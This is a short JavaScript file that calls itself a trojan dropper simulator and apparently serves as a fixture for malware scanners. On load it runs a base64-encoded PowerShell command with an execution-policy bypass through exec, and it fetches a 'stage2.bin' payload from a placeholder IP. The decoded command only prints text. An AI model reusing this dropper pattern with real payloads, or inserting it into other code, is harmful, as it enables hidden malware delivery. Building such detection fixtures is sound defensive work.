/**
 * Trojan Dropper Simulator
 * Triggers child_process execution, dynamic eval, and external payload retrieval
 */
const { exec } = require('child_process');

const remotePayloadUrl = 'http://198.51.100.45/stage2.bin';
const encodedCmd = 'cG93ZXJzaGVsbC5leGUgLU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCBXcml0ZS1Ib3N0IEluamVjdGVk';

function deploy() {
  eval('console.log("Unpacking payload...")');
  atob(encodedCmd);
  exec('powershell.exe -Command ' + atob(encodedCmd));
  fetch(remotePayloadUrl);
}

deploy();
